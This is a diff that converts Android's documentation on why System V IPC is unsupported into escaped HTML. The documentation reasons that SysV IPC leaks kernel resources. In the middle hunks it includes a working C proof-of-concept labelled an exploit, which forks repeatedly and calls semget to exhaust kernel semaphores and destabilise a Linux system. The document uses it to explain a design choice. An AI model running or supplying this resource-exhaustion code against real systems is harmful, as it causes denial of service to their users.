@@ -1,10 +1,10 @@
-Android does not support System V IPCs, i.e. the facilities provided by the
+<html><body><pre>Android does not support System V IPCs, i.e. the facilities provided by the
 following standard Posix headers:
 
-  <sys/sem.h>   /* SysV semaphores */
-  <sys/shm.h>   /* SysV shared memory segments */
-  <sys/msg.h>   /* SysV message queues */
-  <sys/ipc.h>   /* General IPC definitions */
+  &lt;sys/sem.h&gt;   /* SysV semaphores */
+  &lt;sys/shm.h&gt;   /* SysV shared memory segments */
+  &lt;sys/msg.h&gt;   /* SysV message queues */
+  &lt;sys/ipc.h&gt;   /* General IPC definitions */
 
 The reason for this is due to the fact that, by design, they lead to global
 kernel resource leakage.
@@ -28,12 +28,12 @@ And we can't ignore potential malicious applications. As a proof of concept
 here is a simple exploit that you can run on a standard Linux box today:
 
 --------------- cut here ------------------------
-#include <sys/sem.h>
-#include <sys/wait.h>
-#include <unistd.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <errno.h>
+#include &lt;sys/sem.h&gt;
+#include &lt;sys/wait.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;errno.h&gt;
 
 #define  NUM_SEMAPHORES  32
 #define  MAX_FAILS       10
@@ -52,22 +52,22 @@ int  main(void)
         int  ret = fork();
         int  status;
 
-        if (ret < 0) {
+        if (ret &lt; 0) {
             perror("fork:");
             break;
         }
         if (ret == 0) {
             /* in the child */
             ret = semget( (key_t)counter, NUM_SEMAPHORES, IPC_CREAT );
-            if (ret < 0) {
+            if (ret &lt; 0) {
                 return errno;
             }
             return 0;
         }
         else {
             /* in the parent */
-            ret = wait(&status);
-            if (ret < 0) {
+            ret = wait(&amp;status);
+            if (ret &lt; 0) {
                 perror("waitpid:");
                 break;
             }
@@ -75,7 +75,7 @@ int  main(void)
                 status = WEXITSTATUS(status);
                 fprintf(stderr, "child %d FAIL at counter=%d: %d\n", ret,
                                 counter, status);
-                if (++fails >= MAX_FAILS)
+                if (++fails &gt;= MAX_FAILS)
                     break;
             }
         }
@@ -101,3 +101,4 @@ strange things will happen in some parts of the system, but not all.
 For example, in our experience, anything program launched after that that
 calls strerror() will simply crash. The USB sub-system starts spoutting weird
 errors to the system console, etc...
+</pre></body></html>
